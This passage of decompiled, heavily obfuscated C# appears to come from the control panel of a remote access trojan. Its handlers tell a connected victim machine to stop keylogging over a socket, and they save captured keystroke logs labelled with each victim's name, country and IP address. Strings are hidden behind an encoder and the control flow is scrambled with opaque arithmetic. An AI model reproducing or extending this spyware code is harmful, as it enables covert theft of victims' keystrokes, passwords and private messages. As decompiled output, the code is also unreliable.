              (object) ((Microphone) this).classClient
            });
            num1 = (int) num2 * -1941239969 ^ -171133834;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D10) ((Microphone) this).classClient).Keylogg = false;
            num1 = (int) num2 * -1117847415 ^ 673311993;
            continue;
          case 3:
            goto label_6;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void Keylogger_Closing(object sender, CancelEventArgs e)
    {
      if (((Microphone) this).classClient == null)
        return;
label_1:
      int num1 = 1859588348;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(--(-~(743925452 + 1515057885) * 832686279 - num2 * -1843887695) * 822991451)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D10) ((Microphone) this).classClient).Keylogg = false;
            // ISSUE: reference to a compiler-generated field
            ((Microphone) this).classClient.SendMessage(new object[4]
            {
              (object) ((Microphone) this).Client,
              (object) (Client.KeysClient9 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.Keylogger),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0036237496A),
              (object) ((Microphone) this).classClient
            });
            num1 = (int) num3 * -2146816855 ^ 782218667;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      reso.Directory_Exist(((Microphone) this).classClient);
label_1:
      int num1 = -1768361775;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(~(num1 - (1850036443 * -(969657783 - -776534684) - ---136158962 - (1735510877 * ~1017206260 + 1255950939 * -1961917258 + ~-(1161526475 - -675162442)))) * -1915499561) * 1125644483)) % 3U)
        {
          case 1:
            if (Ports.\u0024IR158\u002D1 != null)
            {
              num1 = (int) num2 * 1851397780 ^ -1920288685;
              continue;
            }
            goto label_6;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      WaitCallback callBack = Ports.\u0024IR158\u002D1;
      goto label_7;
label_6:
      // ISSUE: reference to a compiler-generated method
      callBack = Ports.\u0024IR158\u002D1 = new WaitCallback(Ports.\u0024I._Lambda\u0024__R158\u002D1);
label_7:
      object[] state = new object[8]
      {
        (object) this.DGV0,
        (object) ((Ports) this).tmpFolderUSER,
        (object) EXGuarder.\u00318170738,
        (object) ((Ports) this).tmpClientName,
        (object) (((Ports) this).tmpCountry + EXGuarder.\u0037129426F + ((Ports) this).tmpAddressIP),
        (object) EXGuarder.\u00318170738,
        (object) EXGuarder.\u00301417517,
        (object) (DateAndTime.Now.ToString(EXGuarder.\u0035D444D39) + EXGuarder.\u0032D3C2325)
      };
      ThreadPool.QueueUserWorkItem(callBack, (object) state);
    }

    private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.FileName = DateAndTime.Now.ToString(EXGuarder.\u003021C0A05) + EXGuarder.\u003032E4F1D;
label_1:
      int num1 = 2120546288;
      while (true)
      {
        int num2 = num1;
        uint num3;
        WaitCallback callBack;
        switch ((num3 = (uint) (-((((-714339683 * 1500894374 ^ --1227530739) - ~495986460 ^ 348843567) - -1304474661 * ~(~-1535305208 ^ -1192234757 - 537281112) - num2) * -1577801759) * 1947718439 * -308705677 * -1591226391)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            saveFileDialog.Filter = EXGuarder.\u0031A193448;
            int num4 = saveFileDialog.ShowDialog() != DialogResult.OK ? 1647392700 : (num4 = 1176185318);
            num1 = num4 ^ (int) num3 * -876083455;
            continue;
          case 3:
            if (Ports.\u0024IR159\u002D2 == null)
            {
              // ISSUE: reference to a compiler-generated method
              Ports.\u0024IR159\u002D2 = callBack = new WaitCallback(Ports.\u0024I._Lambda\u0024__R159\u002D2);
              break;
            }
            num1 = (int) num3 * -1248030716 ^ -2115203724;
            continue;
          case 4:
            callBack = Ports.\u0024IR159\u002D2;
            break;
          default:
            goto label_9;
        }
        ThreadPool.QueueUserWorkItem(callBack, (object) new object[8]
        {
          (object) this.DGV0,
          (object) EXGuarder.\u0030E282A74,
          (object) saveFileDialog.FileName,
          (object) ((Ports) this).tmpClientName,
          (object) (((Ports) this).tmpCountry + EXGuarder.\u0031A194115 + ((Ports) this).tmpAddressIP),
          (object) EXGuarder.\u00338246E2E,
          (object) EXGuarder.\u0035F626972,
          (object) EXGuarder.\u0030E282A74
        });
        num1 = -405509176;
      }
label_9:
      saveFileDialog.Dispose();
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern Keylogger(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] objs,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void OffLOG(object[] objs);

    public delegate void clearold();
  }
}
